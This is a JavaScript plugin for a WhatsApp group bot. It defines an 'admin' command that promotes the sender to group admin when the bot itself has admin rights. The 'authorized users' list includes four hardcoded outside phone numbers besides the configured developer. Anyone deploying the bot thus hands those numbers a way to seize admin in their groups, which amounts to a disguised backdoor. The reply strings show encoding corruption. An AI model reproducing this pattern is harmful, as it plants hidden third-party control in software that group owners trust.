const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "group",
    react: "üëë",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    if (!isGroup) return reply("‚ùå ·¥õ ú…™s ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö ·¥Ñ·¥Ä…¥ ·¥è…¥ ü è  ô·¥á ·¥ús·¥á·¥Ö …™…¥ …¢ Ä·¥è·¥ú·¥òs.");
    if (!isBotAdmins) return reply("‚ùå …™ …¥·¥á·¥á·¥Ö ·¥õ·¥è  ô·¥á ·¥Ä…¥ ·¥Ä·¥Ö·¥ç…™…¥ ·¥õ·¥è ·¥ò·¥á Ä“ì·¥è Ä·¥ç ·¥õ ú…™s ·¥Ä·¥Ñ·¥õ…™·¥è…¥.");

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        normalizeJid("50948336180"),
        normalizeJid("50934960331"),
        normalizeJid("237682803592"), // ‚Üê ajoute autant que tu veux ici
        normalizeJid("923192173398"),
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply("‚ùå ·¥õ ú…™s ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö …™s  Ä·¥ás·¥õ Ä…™·¥Ñ·¥õ·¥á·¥Ö ·¥õ·¥è ·¥Ä·¥ú·¥õ ú·¥è Ä…™·¥¢·¥á·¥Ö ·¥ús·¥á Äs ·¥è…¥ ü è");
    }

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) {
            return reply("‚ÑπÔ∏è  è·¥è·¥ú' Ä·¥á ·¥Ä ü Ä·¥á·¥Ä·¥Ö è ·¥Ä…¥ ·¥Ä·¥Ö·¥ç…™…¥ …™…¥ ·¥õ ú…™s …¢ Ä·¥è·¥ú·¥ò");
        }

        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        return reply("‚úÖ s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è …¢ Ä·¥Ä…¥·¥õ·¥á·¥Ö  è·¥è·¥ú ·¥Ä·¥Ö·¥ç…™…¥  Ä…™…¢ ú·¥õs!");
    } catch (error) {
        console.error("·¥Ä·¥Ö·¥ç…™…¥ ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö ·¥á Ä Ä·¥è Ä:", error);
        return reply("‚ùå Failed to grant admin rights. Error: " + error.message);
    }
});
